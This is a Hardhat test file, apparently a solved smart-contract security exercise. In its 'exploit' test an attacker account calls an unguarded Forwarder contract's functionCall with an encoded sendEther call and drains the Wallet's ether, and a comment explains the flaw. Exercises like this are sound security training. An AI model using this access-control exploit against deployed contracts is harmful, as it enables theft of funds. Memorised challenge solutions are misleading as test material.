const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const WALLET_NAME = "Wallet";
const FORWARDER_NAME = "Forwarder";
const NAME = "Forwarder tests";

describe(NAME, function () {
  async function setup() {
    const [, attackerWallet] = await ethers.getSigners();
    const value = ethers.utils.parseEther("1");

    const forwarderFactory = await ethers.getContractFactory(FORWARDER_NAME);
    const forwarderContract = await forwarderFactory.deploy();

    const walletFactory = await ethers.getContractFactory(WALLET_NAME);
    const walletContract = await walletFactory.deploy(
      forwarderContract.address,
      { value: value }
    );

    return { walletContract, forwarderContract, attackerWallet };
  }

  describe("exploit", async function () {
    let walletContract,
      forwarderContract,
      attackerWallet,
      attackerWalletBalanceBefore;
    before(async function () {
      ({ walletContract, forwarderContract, attackerWallet } =
        await loadFixture(setup));
      attackerWalletBalanceBefore = await ethers.provider.getBalance(
        attackerWallet.address
      );
    });

    /**
     * The original desgin for Forward contract I think is transfer the rights of executing the sendEther in Wallet to Forward Contract itself.
     * And only Forward contract can call the sendEther function, but its obviously that there no check that Forward funtion can build any arbtrary address
     * and amount while calling the sendEther funciton. And there are no check who can call Forward contract's functionCall.
     * 
     * So, the attack can input its address and the amount they want to withdraw while calling the Forward contract's functionCall. So as to withdraw all the Wallet's eth balance.
     */
    it("conduct your attack here", async function () {


     // abi.encodSignature("sendEther(address, uint256),msg.sender,1 ether")
      let ABI = [
        "function sendEther(address destination, uint256 amount)"
      ];
      let iface = new ethers.utils.Interface(ABI);

      let encodeData =  iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1") ])
      console.log("abiEncodeData:",encodeData);

      await  forwarderContract.connect(attackerWallet).functionCall(walletContract.address,encodeData);
      // reference: https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010

    });

    after(async function () {
      const attackerWalletBalanceAfter = await ethers.provider.getBalance(
        attackerWallet.address
      );
      expect(
        attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)
      ).to.be.closeTo(ethers.utils.parseEther("1"), 1000000000000000);

      const walletContractBalance = await ethers.provider.getBalance(
        walletContract.address
      );
      expect(walletContractBalance).to.be.equal("0");
    });
  });
});
